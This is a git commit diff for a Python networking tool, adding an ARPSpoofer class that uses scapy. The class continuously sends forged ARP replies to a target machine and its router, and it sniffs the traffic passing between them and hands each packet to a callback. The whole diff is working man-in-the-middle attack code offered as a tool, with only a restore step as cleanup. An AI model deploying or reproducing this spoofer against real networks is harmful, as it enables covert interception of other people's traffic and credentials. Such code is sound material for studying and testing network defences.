abb8875e9186041d8dbf3e457bcb0475603697b5
Gaspard Culis <gaspard.culis@gmail.com>
2022-06-14 18:55:21 +0200

    Made some progress on the ARPSpoofer

--- nifty/network/arp/spoof.py
+++ nifty/network/arp/spoof.py
@@ -1,7 +1,8 @@
 import os
-import scapy.all as scapy
+from scapy.all import *
 from time import sleep
 from ..utils import get_mac, get_router_ip
+import multiprocessing
 
 
 class ARPSpoofer():
@@ -10,17 +11,29 @@ class ARPSpoofer():
         self.router_ip = router_ip
         self.target_mac = get_mac(self.target_ip, interface)
         self.router_mac = get_mac(self.router_ip, interface)
+        if not self.target_mac:
+            raise Exception("Couldn't find target MAC")
+        if not self.router_mac:
+            raise Exception("Couldn't find router MAC")
 
-    def run(self, on_packet_callback, verbose=True):
-        send()
+    def arp_poison(self):
+        while 1:
+            send(ARP(op=2, pdst=self.target_ip,
+                     psrc=self.router_ip, hwdst=self.target_mac))
+            send(ARP(op=2, pdst=self.router_ip,
+                     psrc=self.target_ip, hwdst=self.router_mac))
 
-    def trick():
-        send(ARP(op=2, pdst=self.target_ip,
-             psrc=self.router_ip, hwdst=self.target_mac))
-        send(ARP(op=2, pdst=self.router_ip,
-             psrc=self.target_ip, hwdst=self.router_mac))
+    def run(self, on_pckt_callback):
+        poison_process = multiprocessing.Process(target=self.arp_poison)
+        poison_process.start()
+        try:
+            sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s))' % (
+                self.router_ip, self.target_ip, self.target_ip, self.router_ip), prn=lambda x: on_pckt_callback(x))
+        except KeyboardInterrupt:
+            poison_process.terminate()
+            self.stop()
 
-    def stop(verbose=True):
+    def stop(self, verbose=True):
         if verbose:
             print("Restoring targets")
         send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip,
